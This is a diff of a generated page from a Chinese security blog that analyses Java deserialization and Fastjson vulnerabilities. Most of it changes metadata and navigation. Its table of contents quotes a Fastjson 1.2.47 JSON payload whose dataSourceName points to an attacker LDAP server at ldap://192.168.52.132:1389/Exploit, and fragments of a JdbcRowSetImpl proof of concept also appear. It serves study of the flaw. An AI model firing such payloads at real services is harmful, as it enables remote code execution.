@@ -2,68 +2,29 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>六月的雨</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="六月的雨">
+  <title>Java反序列化-Fastjson漏洞全分析 | 六月的雨</title>
+  <meta name="keywords" content=" Hexo , Markdown ">
+  <meta name="description" content="Java反序列化-Fastjson漏洞全分析 | 六月的雨">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="title: Java反序列化-Fastjsonl各版本漏洞分析date: 2021-12-01 15:38:12tags:  Hexo Markdowncategories: Java反序列化  JNDI注入分析前言RMI利用的JDK版本≤ JDK 6u132、7u122、8u113 LADP利用JDK版本≤ 6u211 、7u201、8u191之后版本存在trustCodebaseURL的限制">
+<meta name="description" content="Fastjson不出网利用0x01 Teamplates   0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource2.1 利⽤条件 ⽆需⽬标额外开启选项，也不⽤连接外部服务器 但需要应⽤部署在Tomcat应⽤环境中，因为Tomcat应⽤环境⾃带tomcat-dbcp.jar 对于SpringBoot这种⾃带Tomcat可以直接以单个ja">
 <meta property="og:type" content="article">
-<meta property="og:title" content="六月的雨">
-<meta property="og:url" content="http://example.com/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="Java反序列化-Fastjson不出网利用">
+<meta property="og:url" content="http://example.com/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/index.html">
 <meta property="og:site_name" content="六月的雨">
-<meta property="og:description" content="title: Java反序列化-Fastjsonl各版本漏洞分析date: 2021-12-01 15:38:12tags:  Hexo Markdowncategories: Java反序列化  JNDI注入分析前言RMI利用的JDK版本≤ JDK 6u132、7u122、8u113 LADP利用JDK版本≤ 6u211 、7u201、8u191之后版本存在trustCodebaseURL的限制">
+<meta property="og:description" content="Fastjson不出网利用0x01 Teamplates   0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource2.1 利⽤条件 ⽆需⽬标额外开启选项，也不⽤连接外部服务器 但需要应⽤部署在Tomcat应⽤环境中，因为Tomcat应⽤环境⾃带tomcat-dbcp.jar 对于SpringBoot这种⾃带Tomcat可以直接以单个ja">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://p5.ssl.qhimg.com/t01d1736917cdcf7608.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211214104500479.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211214102617832.png">
-<meta property="og:image" content="https://cdn.wjlshare.com/image-20211126092133654.png">
-<meta property="og:image" content="https://cdn.wjlshare.com/image-20211126093005807.png">
-<meta property="og:image" content="https://cdn.wjlshare.com/image-20211126093435230.png">
-<meta property="og:image" content="https://cdn.wjlshare.com/image-20211126093828747.png">
-<meta property="og:image" content="https://cdn.wjlshare.com/image-20211126094006014.png">
-<meta property="og:image" content="https://cdn.wjlshare.com/image-20211126110826337.png">
-<meta property="og:image" content="https://cdn.wjlshare.com/image-20211126110728734.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223142229621.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211214112824417.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211214112839559.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211213174531937.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211213174655253.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211221163039933.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222142007435.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222144237325.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222144424557.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222152011346.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222152358812.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222153430331.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222154048854.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222155214727.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222154638534.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222151641106.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222174955337.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222175120326.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222181251215.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222175220855.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222175501540.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222181706301.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223094108403.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223094222245.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223095052263.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223110509990.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223110610844.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223113356303.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223114537891.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223114708788.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223115134767.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223101546323.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223143209991.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223143850489.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223150747117.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223150828428.png">
-<meta property="article:published_time" content="2021-12-13T06:17:03.785Z">
-<meta property="article:modified_time" content="2021-12-23T09:27:02.616Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224093044624.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101406330.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101721116.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101843513.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101905153.png">
+<meta property="article:published_time" content="2021-12-18T14:00:12.000Z">
+<meta property="article:modified_time" content="2021-12-24T02:48:28.280Z">
 <meta property="article:author" content="juneRain">
+<meta property="article:tag" content="Hexo">
+<meta property="article:tag" content="Markdown">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://p5.ssl.qhimg.com/t01d1736917cdcf7608.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224093044624.png">
 
 
 <link rel="icon" href="/img/1.jpg">
@@ -277,7 +238,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(23)</small>
+                <small>(25)</small>
             
         </div>
     </li>
@@ -358,7 +319,7 @@
                     <div data-rel="Java反序列化">
                         
                         Java反序列化
-                        <small>(4)</small>
+                        <small>(7)</small>
                         
                     </div>
                     
@@ -400,8 +361,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="23">
-<input type="hidden" id="yelog_site_word_count" value="42.1k">
+<input type="hidden" id="yelog_site_posts_number" value="25">
+<input type="hidden" id="yelog_site_word_count" value="49.4k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -461,12 +422,28 @@
     
     <nav id="title-list-nav">
         
-        <a  class="All "
-           href="/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%88%86%E6%9E%90/"
-           data-tag=""
+        <a  class="All Java反序列化 "
+           href="/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"
+           data-tag="Hexo,Markdown"
            data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2021-12-13 14:17:03">2021/12/13</span>
+            <span class="post-title" title="Java反序列化-Fastjson不出网利用">Java反序列化-Fastjson不出网利用</span>
+            <span class="post-date" title="2021-12-18 22:00:12">2021/12/18</span>
+        </a>
+        
+        <a  class="All Java反序列化 "
+           href="/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections1%E5%88%86%E6%9E%90%20-%20%E5%89%AF%E6%9C%AC/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="Java反序列化-Fastjson漏洞全分析">Java反序列化-Fastjson漏洞全分析</span>
+            <span class="post-date" title="2021-12-18 18:00:12">2021/12/18</span>
+        </a>
+        
+        <a  class="All Java反序列化 "
+           href="/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%88%86%E6%9E%90/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="Java反序列化-Fastjson漏洞全分析">Java反序列化-Fastjson漏洞全分析</span>
+            <span class="post-date" title="2021-12-18 18:00:12">2021/12/18</span>
         </a>
         
         <a  class="All Java反序列化 "
@@ -486,18 +463,18 @@
         </a>
         
         <a  class="All Java反序列化 "
-           href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="Java反序列化-CommonsCollections3-7分析">Java反序列化-CommonsCollections3-7分析</span>
-            <span class="post-date" title="2021-12-06 22:00:12">2021/12/06</span>
-        </a>
-        
-        <a  class="All Java反序列化 "
            href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/"
            data-tag="Hexo,Markdown"
            data-author="" >
             <span class="post-title" title="Java反序列化-CommonsCollections2分析">Java反序列化-CommonsCollections2分析</span>
+            <span class="post-date" title="2021-12-06 22:00:12">2021/12/06</span>
+        </a>
+        
+        <a  class="All Java反序列化 "
+           href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="Java反序列化-CommonsCollections3-7分析">Java反序列化-CommonsCollections3-7分析</span>
             <span class="post-date" title="2021-12-06 22:00:12">2021/12/06</span>
         </a>
         
@@ -566,18 +543,18 @@
         </a>
         
         <a  class="All JAVA代码审计 "
-           href="/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%8A%A5%E9%94%991/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-Cannot resolve org.springframework:spring-jcl:5.0.10.RELEASE解决方法">java代码审计-Cannot resolve org.springframework:spring-jcl:5.0.10.RELEASE解决方法</span>
-            <span class="post-date" title="2021-09-07 23:22:12">2021/09/07</span>
-        </a>
-        
-        <a  class="All JAVA代码审计 "
            href="/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%8A%A5%E9%94%992/"
            data-tag="Hexo,Markdown"
            data-author="" >
             <span class="post-title" title="java代码审计-Error creating bean with name &#39;org.springframework.web.servlet.mvc.method.an解决方法">java代码审计-Error creating bean with name &#39;org.springframework.web.servlet.mvc.method.an解决方法</span>
+            <span class="post-date" title="2021-09-07 23:22:12">2021/09/07</span>
+        </a>
+        
+        <a  class="All JAVA代码审计 "
+           href="/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%8A%A5%E9%94%991/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="java代码审计-Cannot resolve org.springframework:spring-jcl:5.0.10.RELEASE解决方法">java代码审计-Cannot resolve org.springframework:spring-jcl:5.0.10.RELEASE解决方法</span>
             <span class="post-date" title="2021-09-07 23:22:12">2021/09/07</span>
         </a>
         
@@ -590,18 +567,18 @@
         </a>
         
         <a  class="All JAVA代码审计 "
-           href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SSM%E6%A1%86%E6%9E%B6-SpringMVC%E5%85%A5%E9%97%A8/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-SSM框架-SpringMVC入门">java代码审计-SSM框架-SpringMVC入门</span>
-            <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
-        </a>
-        
-        <a  class="All JAVA代码审计 "
            href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-IDEA%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"
            data-tag="Hexo,Markdown"
            data-author="" >
             <span class="post-title" title="java代码审计-IDEA常用快捷键">java代码审计-IDEA常用快捷键</span>
+            <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
+        </a>
+        
+        <a  class="All JAVA代码审计 "
+           href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SSM%E6%A1%86%E6%9E%B6-SpringMVC%E5%85%A5%E9%97%A8/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="java代码审计-SSM框架-SpringMVC入门">java代码审计-SSM框架-SpringMVC入门</span>
             <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
         </a>
         
@@ -663,22 +640,41 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Java反序列化-Fastjson漏洞全分析" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Java反序列化-CommonsCollections1分析 - 副本" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Java反序列化-Fastjson漏洞全分析</h1>
     
     <div class="article-meta">
         
         
         
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Java反序列化">Java反序列化</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">Hexo</a>
+            
+            <a class="color4">Markdown</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-12-23 17:27:02'>2021-12-13 14:17</time>
+            Created At : <time class="date" title='Updated At: 2021-12-24 11:23:54'>2021-12-18 18:00</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:5.2k</span>
+        <span>Count:5.3k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -708,7 +704,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90"><span class="toc-text">JNDI注入分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#readObject%E6%94%BB%E5%87%BBRMI"><span class="toc-text">readObject攻击RMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-JNDI-RMI"><span class="toc-text">0x01 JNDI+RMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-JNDI-LDAP"><span class="toc-text">0x02 JNDI+LDAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-JNDI-%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8-Bypass-%E9%AB%98%E7%89%88%E6%9C%AC-JDK-%E9%99%90%E5%88%B6"><span class="toc-text">0x03 JNDI 注入利用 Bypass 高版本 JDK 限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-Bypass1%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96Payload%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0Gadget"><span class="toc-text">3.1 Bypass1：返回序列化Payload，触发本地Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Evil-LDAP-Server"><span class="toc-text">Evil LDAP Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Victim-Client"><span class="toc-text">Victim Client</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Bypass-2%EF%BC%9A%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0Class%E4%BD%9C%E4%B8%BAReference-Factory"><span class="toc-text">3.2  Bypass 2：利用本地Class作为Reference Factory</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Fastjson1-2-24-JDNI%E6%B3%A8%E5%85%A5"><span class="toc-text">0x04 Fastjson1.2.24 + JDNI注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Fastjson1-2-25%E6%94%B9%E5%8A%A8"><span class="toc-text">0x05 Fastjson1.2.25改动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Fastjson-1-2-41%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x06 Fastjson 1.2.41版本漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-Fastjson-1-2-42%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x07 Fastjson 1.2.42版本漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x08 Fastjson 1.2.47漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E4%B8%AAjson%E5%AD%97%E7%AC%A6%E4%B8%B2-quot-type-quot-quot-java-lang-Class-quot-quot-val-quot-quot-com-sun-rowset-JdbcRowSetImpl-quot"><span class="toc-text">分析第一个json字符串{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%AC%AC%E4%BA%8C%E4%B8%AAjson%E5%AD%97%E7%AC%A6%E4%B8%B2-quot-type-quot-quot-com-sun-rowset-JdbcRowSetImpl-quot-quot-dataSourceName-quot-quot-ldap-192-168-52-132-1389-Exploit-quot-quot-autoCommit-quot-true"><span class="toc-text">分析第二个json字符串{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.52.132:1389&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true}</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-1-2-48%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-text">0x09 1.2.48补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-fastjson-1-2-68-%E7%BB%95%E8%BF%87autotype"><span class="toc-text">0x10 fastjson 1.2.68 绕过autotype</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-dnslog%E5%88%A4%E6%96%AD%E5%90%8E%E7%AB%AF%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8fastjson"><span class="toc-text">0x11 dnslog判断后端是否使用fastjson</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93"><span class="toc-text">简单总结</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90"><span class="toc-text">JNDI注入分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#readObject%E6%94%BB%E5%87%BBRMI"><span class="toc-text">readObject攻击RMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-JNDI-RMI"><span class="toc-text">0x01 JNDI+RMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-JNDI-LDAP"><span class="toc-text">0x02 JNDI+LDAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-JNDI-%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8-Bypass-%E9%AB%98%E7%89%88%E6%9C%AC-JDK-%E9%99%90%E5%88%B6"><span class="toc-text">0x03 JNDI 注入利用 Bypass 高版本 JDK 限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-Bypass1%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96Payload%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0Gadget"><span class="toc-text">3.1 Bypass1：返回序列化Payload，触发本地Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Evil-LDAP-Server"><span class="toc-text">Evil LDAP Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Victim-Client"><span class="toc-text">Victim Client</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Bypass-2%EF%BC%9A%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0Class%E4%BD%9C%E4%B8%BAReference-Factory"><span class="toc-text">3.2  Bypass 2：利用本地Class作为Reference Factory</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Fastjson1-2-24-JDNI%E6%B3%A8%E5%85%A5"><span class="toc-text">0x04 Fastjson1.2.24 + JDNI注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Fastjson1-2-25%E6%94%B9%E5%8A%A8"><span class="toc-text">0x05 Fastjson1.2.25改动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Fastjson-1-2-41%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x06 Fastjson 1.2.41版本漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-Fastjson-1-2-42%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x07 Fastjson 1.2.42版本漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x08 Fastjson 1.2.47漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E4%B8%AAjson%E5%AD%97%E7%AC%A6%E4%B8%B2-quot-type-quot-quot-java-lang-Class-quot-quot-val-quot-quot-com-sun-rowset-JdbcRowSetImpl-quot"><span class="toc-text">分析第一个json字符串{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%AC%AC%E4%BA%8C%E4%B8%AAjson%E5%AD%97%E7%AC%A6%E4%B8%B2-quot-type-quot-quot-com-sun-rowset-JdbcRowSetImpl-quot-quot-dataSourceName-quot-quot-ldap-192-168-52-132-1389-Exploit-quot-quot-autoCommit-quot-true"><span class="toc-text">分析第二个json字符串{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.52.132:1389&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true}</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-1-2-48%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-text">0x09 1.2.48补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-fastjson-1-2-68-%E7%BB%95%E8%BF%87autotype"><span class="toc-text">0x10 fastjson 1.2.68 绕过autotype</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-dnslog%E5%88%A4%E6%96%AD%E5%90%8E%E7%AB%AF%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8fastjson"><span class="toc-text">0x11 dnslog判断后端是否使用fastjson</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93"><span class="toc-text">简单总结</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -724,12 +720,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>title: Java反序列化-Fastjsonl各版本漏洞分析<br>date: 2021-12-01 15:38:12<br>tags:</p>
-<ul>
-<li>Hexo</li>
-<li>Markdown<br>categories: Java反序列化</li>
-</ul>
-<h1 id="JNDI注入分析"><a href="#JNDI注入分析" class="headerlink" title="JNDI注入分析"></a>JNDI注入分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>RMI利用的JDK版本≤ JDK 6u132、7u122、8u113</p>
+        <h1 id="JNDI注入分析"><a href="#JNDI注入分析" class="headerlink" title="JNDI注入分析"></a>JNDI注入分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>RMI利用的JDK版本≤ JDK 6u132、7u122、8u113</p>
 <p>LADP利用JDK版本≤ 6u211 、7u201、8u191之后版本存在trustCodebaseURL的限制，只信任已有的codebase地址</p>
 <p><img src="https://p5.ssl.qhimg.com/t01d1736917cdcf7608.png" alt="img"></p>
 <h2 id="readObject攻击RMI"><a href="#readObject攻击RMI" class="headerlink" title="readObject攻击RMI"></a>readObject攻击RMI</h2><p>环境：</p>
@@ -1008,7 +999,7 @@ public class JdbcRowSetImplPoc &#123;
 <p> 删去package，并使用java命令行编译</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211213174655253.png" alt="image-20211213174655253"></p>
 <p>这个问题折磨了我半天时间……,一开始以为是jdk版本问题。</p>
-<p>1.3 RMI+JdbcRowSetImpl</p>
+<p>4.2 RMI+JdbcRowSetImpl</p>
 <p><strong>Poc</strong></p>
 <pre><code>import com.alibaba.fastjson.JSON;
 import com.sun.rowset.JdbcRowSetImpl;
@@ -1065,7 +1056,9 @@ public class EvilObject &#123;
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211221163039933.png" alt="image-20211221163039933"></p>
 <h2 id="0x05-Fastjson1-2-25改动"><a href="#0x05-Fastjson1-2-25改动" class="headerlink" title="0x05 Fastjson1.2.25改动"></a>0x05 Fastjson1.2.25改动</h2><p>Fastjson从1.2.25开始引入了checkAutotype安全机制，通过黑名单+白名单机制来防御。</p>
 <p>1.AutoTypeSupport</p>
-<p>True的时候，开启AutoType功能。</p>
+<p>1.2.25版本之后默认关闭AutoType功能。</p>
+<p>AutoType功能这里说一下：</p>
